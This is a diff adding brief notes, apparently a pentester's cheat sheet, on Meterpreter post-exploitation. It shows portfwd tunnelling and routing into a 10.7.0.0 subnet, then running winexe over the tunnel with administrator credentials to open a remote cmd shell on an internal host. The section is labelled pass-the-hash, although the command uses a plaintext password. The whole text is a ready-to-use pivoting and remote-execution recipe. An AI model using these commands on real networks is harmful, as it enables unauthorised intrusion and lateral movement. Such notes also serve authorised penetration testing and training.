@@ -1,0 +1,21 @@
+Use portfwd in Meterpreter
+meterpreter > portfwd add –l 3389 –p 3389 –r  [target host]
+meterpreter > portfwd delete –l 3389 –p 3389 –r [target host]
+meterpreter > portfwd list
+
+
+"add" : will add the port forwarding to the list and will essentially create a tunnel for us. Please note, this tunnel will also exist outside the Metasploit console, making it available to any terminal session.
+-l 3389 : is the local port that will be listening and forwarded to our target. This can be any port on your machine, as long as it’s not already being used.
+-p 3389 : is the destination port on our targeting host.
+
+
+
+Background session, Use a Combonation of Port Forwarding and "Pass-the-Hash" Win.exe
+> bg
+> route add 10.7.0.0 255.255.255.0 1
+> sessions -i 1
+> portfwd add -l 445 -p 445 -r 10.7.0.22
+
+
+Now any traffic will be routed through the meterpreter session
+> winexe -U administrator%secretpassword //127.0.0.1 "cmd"
